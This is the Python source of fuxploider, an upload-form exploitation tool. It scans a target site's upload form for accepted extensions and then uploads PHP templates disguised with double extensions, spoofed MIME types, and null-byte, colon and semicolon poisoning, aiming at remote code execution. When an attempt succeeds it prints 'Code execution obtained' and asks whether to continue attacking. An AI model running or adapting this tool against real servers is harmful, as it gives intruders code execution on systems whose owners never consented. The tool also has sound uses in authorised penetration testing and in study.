#!/usr/bin/python3
import re,requests,argparse,logging,os,coloredlogs,datetime,getpass,tempfile
from utils import *
from UploadForm import UploadForm

version = "0.1.8"
logging.basicConfig(datefmt='[%m/%d/%Y-%H:%M:%S]')
logger = logging.getLogger("fuxploider")

coloredlogs.install(logger=logger,fmt='%(asctime)s %(levelname)s - %(message)s',level=logging.INFO)
logging.getLogger("requests").setLevel(logging.ERROR)

parser = argparse.ArgumentParser()
parser.add_argument("-d", "--data", metavar="postData",dest="data", help="Additionnal data to be transmitted via POST method. Example : -d \"key1=value1&key2=value2\"", type=valid_postData)
parser.add_argument("--proxy", metavar="proxyUrl", dest="proxy", help="Proxy information. Example : --proxy \"user:password@proxy.host:8080\"", type=valid_proxyString)
parser.add_argument("--proxy-creds",metavar="credentials",nargs='?',const=True,dest="proxyCreds",help="Prompt for proxy credentials at runtime. Format : 'user:pass'",type=valid_proxyCreds)
parser.add_argument("-f","--filesize",metavar="integer",nargs=1,default=["10"],dest="size",help="File size to use for files to be created and uploaded (in kB).")
parser.add_argument("--cookies",metavar="omnomnom",nargs=1,dest="cookies",help="Cookies to use with HTTP requests. Example : PHPSESSID=aef45aef45afeaef45aef45&JSESSID=AQSEJHQSQSG",type=valid_postData)
parser.add_argument("--uploads-path",default=[None],metavar="path",nargs=1,dest="uploadsPath",help="Path on the remote server where uploads are put. Example : '/tmp/uploads/'")
requiredNamedArgs = parser.add_argument_group('Required named arguments')
requiredNamedArgs.add_argument("-u","--url", metavar="target", dest="url",required=True, help="Web page URL containing the file upload form to be tested. Example : http://test.com/index.html?action=upload", type=valid_url)
requiredNamedArgs.add_argument("--not-regex", metavar="regex", help="Regex matching an upload failure", type=valid_regex,dest="notRegex")
requiredNamedArgs.add_argument("--true-regex",metavar="regex", help="Regex matching an upload success", type=valid_regex, dest="trueRegex")

exclusiveArgs = parser.add_mutually_exclusive_group()
exclusiveArgs.add_argument("-l","--legit-extensions",metavar="listOfExtensions",dest="legitExtensions",nargs=1,help="Legit extensions expected, for a normal use of the form, comma separated. Example : 'jpg,png,bmp'")
exclusiveArgs.add_argument("-n",metavar="n",nargs=1,default=["100"],dest="n",help="Number of common extensions to use. Example : -n 100", type=valid_nArg)

exclusiveVerbosityArgs = parser.add_mutually_exclusive_group()
exclusiveVerbosityArgs.add_argument("-v",action="store_true",required=False,dest="verbose",help="Verbose mode")
exclusiveVerbosityArgs.add_argument("-vv",action="store_true",required=False,dest="veryVerbose",help="Very verbose mode")
exclusiveVerbosityArgs.add_argument("-vvv",action="store_true",required=False,dest="veryVeryVerbose",help="Much verbose, very log, wow.")

parser.add_argument("-s","--skip-recon",action="store_true",required=False,dest="skipRecon",help="Skip recon phase, where fuxploider tries to determine what extensions are expected and filtered by the server. Needs -l switch.")
parser.add_argument("-y",action="store_true",required=False,dest="detectAllEntryPoints",help="Force detection of every entry points without asking to continue each time one is found.")

args = parser.parse_args()
args.uploadsPath = args.uploadsPath[0]

args.verbosity = 0
if args.verbose :
	args.verbosity = 1
if args.veryVerbose :
	args.verbosity = 2
if args.veryVeryVerbose :
	args.verbosity = 3
logger.verbosity = args.verbosity
if args.verbosity > 0 :
	coloredlogs.install(logger=logger,fmt='%(asctime)s %(levelname)s - %(message)s',level=logging.DEBUG)


if args.proxyCreds and args.proxy == None :
	parser.error("--proxy-creds must be used with --proxy.")

if args.skipRecon and args.legitExtensions == None :
	parser.error("-s switch needs -l switch. Cannot skip recon phase without any known entry point.")

args.n = int(args.n[0])
args.size = int(args.size[0])
args.size = 1024*args.size

if not args.notRegex and not args.trueRegex :
	parser.error("At least one detection method must be provided, either with --not-regex or with --true-regex.")

if args.legitExtensions :
	args.legitExtensions = args.legitExtensions[0].split(",")

if args.cookies :
	args.cookies = postDataFromStringToJSON(args.cookies[0])

print("""\033[1;32m
                                     
 ___             _     _   _         
|  _|_ _ _ _ ___| |___|_|_| |___ ___ 
|  _| | |_'_| . | | . | | . | -_|  _|
|_| |___|_,_|  _|_|___|_|___|___|_|  
            |_|                      

\033[1m\033[42m{version """+version+"""}\033[m

\033[m[!] legal disclaimer : Usage of fuxploider for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
	""")
if args.proxyCreds == True :
	args.proxyCreds = {}
	args.proxyCreds["username"] = input("Proxy username : ")
	args.proxyCreds["password"] = getpass.getpass("Proxy password : ")

now = datetime.datetime.now()

print("[*] starting at "+str(now.hour)+":"+str(now.minute)+":"+str(now.second))

#mimeFile = "mimeTypes.advanced"
mimeFile = "mimeTypes.basic"
extensions = loadExtensions("file",mimeFile)
tmpLegitExt = []
if args.legitExtensions :
	args.legitExtensions = [x.lower() for x in args.legitExtensions]
	foundExt = [a[0] for a in extensions]
	for b in args.legitExtensions :
		if b in foundExt :
			tmpLegitExt.append(b)
		else :
			logging.warning("Extension %s can't be found as a valid/known extension with associated mime type.",b)
args.legitExtensions = tmpLegitExt

postData = postDataFromStringToJSON(args.data)

s = requests.Session()
if args.cookies :
	for key in args.cookies.keys() :
		s.cookies[key] = args.cookies[key]

##### PROXY HANDLING #####
s.trust_env = False
if args.proxy :
	if args.proxy["username"] and args.proxy["password"] and args.proxyCreds :
		logging.warning("Proxy username and password provided by the --proxy-creds switch replaces credentials provided using the --proxy switch")
	if args.proxyCreds :
		proxyUser = args.proxyCreds["username"]
		proxyPass = args.proxyCreds["password"]
	else :
		proxyUser = args.proxy["username"]
		proxyPass = args.proxy["password"]
	proxyProtocol = args.proxy["protocol"]
	proxyHostname = args.proxy["hostname"]
	proxyPort = args.proxy["port"]
	proxy = ""
	if proxyProtocol != None :
		proxy += proxyProtocol+"://"
	else :
		proxy += "http://"

	if proxyUser != None and proxyPass != None :
		proxy += proxyUser+":"+proxyPass+"@"

	proxy += proxyHostname
	if proxyPort != None :
		proxy += ":"+proxyPort

	if proxyProtocol == "https" :
		proxies = {"https":proxy}
	else :
		proxies = {"http":proxy,"https":proxy}

	s.proxies.update(proxies)
#########################################################

up = UploadForm(args.notRegex,args.trueRegex,s,args.size,postData,args.uploadsPath)
up.setup(args.url)
#########################################################

############################################################
uploadURL = up.uploadUrl
fileInput = {"name":up.inputName}

###### VALID EXTENSIONS DETECTION FOR THIS FORM ######
if not args.skipRecon :
	if len(args.legitExtensions) > 0 :
		n = up.detectValidExtensions(extensions,args.n,args.legitExtensions)
	else :
		n = up.detectValidExtensions(extensions,args.n)
	logger.info("### Tried %s extensions, %s are valid.",n,len(up.validExtensions))
else :
	logger.info("### Skipping detection of valid extensions, using provided extensions instead (%s)",args.legitExtensions)
	up.validExtensions = args.legitExtensions

if up.validExtensions == [] :
	logger.error("No valid extension found.")
	exit()

entryPoints = []

#################### TEMPLATE CHOICE HERE, NEEDS TO CHANGE LATER ######################
templates = [
	{
		"filename":"template.php",
		"extension":"php",
		"codeExecRegex":"74b928cc738434fb9e4d2f387398958c7e5e816a921ad7d8226ebff094f5ad7b5ec865beccf654e7eca540dd6dd3e17aa11df23f9101ab8436b724ab0bef168b",
		"extVariants":["php1","php2","php3","php4","php5","phtml","pht"]
	},{
		"filename":"template.gif",
		"extension":"php",
		"codeExecRegex":"74b928cc738434fb9e4d2f387398958c7e5e816a921ad7d8226ebff094f5ad7b5ec865beccf654e7eca540dd6dd3e17aa11df23f9101ab8436b724ab0bef168b",
		"extVariants":["php1","php2","php3","php4","php5","phtml","pht"]
	}
	]
#######################################################################################
logger.info("### Starting shell upload detection (messing with file extensions and mime types...)")
wantToStop = False
for template in templates :
	logger.debug("Template in use : %s",template)
	if wantToStop :
		break
	#template[0] : file name
	#template[1] : extension
	#template[2] : regex for code exec detection
	#template[3] : extensions variants
	templatefd = open(template["filename"],"rb")
	nastyExt = template["extension"]
	nastyMime = getMime(extensions,nastyExt)
	nastyExtVariants = template["extVariants"]
	#################################################################



	attempts = []
	#########################################################################################
	nbOfValidExtensions = len(up.validExtensions)
	nbOfEntryPointsFound = 0
	i = 0
	while not wantToStop and i < nbOfValidExtensions :
		legitExt = up.validExtensions[i]
		legitMime = getMime(extensions,legitExt)
		#exec all known techniques
		##	for each variant of the code execution trigerring extension (php,asp etc)
		### using either bad or good mime type
		for nastyVariant in nastyExtVariants+[nastyExt] :
			##Naive attempt
			attempts.append({"suffix":"."+nastyExt,"mime":nastyMime})
			##mime type tampering
			attempts.append({"suffix":"."+nastyVariant,"mime":legitMime})
			##double extension bad.good with nasty mime type
			attempts.append({"suffix":"."+nastyVariant+"."+legitExt,"mime":nastyMime})
			##double extension bad.good with gentle mime type
			attempts.append({"suffix":"."+nastyVariant+"."+legitExt,"mime":legitMime})
			##double extension good.bad with nasty mime type
			attempts.append({"suffix":"."+legitExt+"."+nastyVariant,"mime":nastyMime})
			##double extension good.bad with good mime type
			attempts.append({"suffix":"."+legitExt+"."+nastyVariant,"mime":legitMime})
			##null byte poisoning - legit mime type
			attempts.append({"suffix":"."+nastyVariant+"%00."+legitExt,"mime":legitMime})
			##null byte poisoning - nasty mime type
			attempts.append({"suffix":"."+nastyVariant+"%00."+legitExt,"mime":nastyMime})
			##':' byte poisoning - legit mime type
			attempts.append({"suffix":"."+nastyVariant+":."+legitExt,"mime":legitMime})
			##':' byte poisoning - nasty mime type
			attempts.append({"suffix":"."+nastyVariant+":."+legitExt,"mime":nastyMime})
			##';' byte poisoning - legit mime type
			attempts.append({"suffix":"."+nastyVariant+";."+legitExt,"mime":legitMime})
			##';' byte poisoning - nasty mime type
			attempts.append({"suffix":"."+nastyVariant+";."+legitExt,"mime":nastyMime})

		for a in attempts :
			suffix = a["suffix"]
			mime = a["mime"]

			res = up.submitTestCase(suffix,mime,templatefd.read(),template["codeExecRegex"])
			templatefd.seek(0)
			if res["codeExec"] :
				logging.info("\033[1m\033[42mCode execution obtained ('%s','%s','%s')\033[m",suffix,mime,template["filename"])
				nbOfEntryPointsFound += 1
				foundEntryPoint = a
				foundEntryPoint["template"] = template["filename"]
				################
				################ a enlever/continuer ici, tentative d'utilisation des getimagesize pour bypasser tout le bozin
				################
				if foundEntryPoint["template"] == "template.gif" :
					print(foundEntryPoint)
					input()
				################
				################
				################
				entryPoints.append(foundEntryPoint)
				if not args.detectAllEntryPoints :
					cont = input("Continue attacking ? [y/N] : ")
					if cont not in ["y","Y","yes","YES","Yes"] :
						wantToStop = True
						break


		i += 1
	templatefd.close()

logging.info("%s entry point(s) found using %s HTTP requests.",nbOfEntryPointsFound,up.httpRequests)
print("Found the following entry points : ")
print(entryPoints)